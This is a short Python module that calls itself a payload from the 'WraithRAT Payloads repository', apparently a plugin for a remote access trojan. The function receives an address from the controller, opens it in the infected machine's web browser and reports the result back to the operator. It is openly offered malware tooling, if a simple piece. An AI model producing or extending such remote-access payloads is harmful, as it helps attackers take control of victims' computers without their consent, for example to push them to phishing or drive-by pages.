# Part of the WraithRAT Payloads repository
# Each payload must be placed in the server/assets/wraith-scripts directory
# Note: Comments should be removed so less data needs to be sent to the wraith

def script_main(wraith, cmdline):
    address = " ".join(cmdline.split(" ")[1:])
    try:
        webbrowser.open(address)
        wraith.putresult("SUCCESS", "Opened `{}`".format(address))
    except Exception as e:
        wraith.putresult("ERROR", "Could not open `{}`".format(address))
